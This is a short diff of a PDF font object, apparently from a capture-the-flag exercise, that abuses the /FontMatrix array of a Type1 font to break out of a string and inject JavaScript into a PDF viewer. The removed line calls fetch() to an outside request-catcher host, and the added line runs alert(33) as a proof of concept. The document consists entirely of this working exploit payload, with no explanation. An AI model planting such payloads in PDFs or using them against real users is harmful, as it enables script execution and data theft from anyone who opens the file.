@@ -27,7 +27,8 @@ endobj
 /BaseFont/PAXEKO+SourceSansPro-Bold
 /LastChar 102
 /Encoding/WinAnsiEncoding
-/FontMatrix [1 2 3 4 5 (0\); fetch\('https://rvxndta.request.dreamhack.games')]
+/FontMatrix [0.1 0 0 0.1 0 (1\);
+alert\(33\)
 //)]
 /Subtype/Type1
 /FirstChar 65
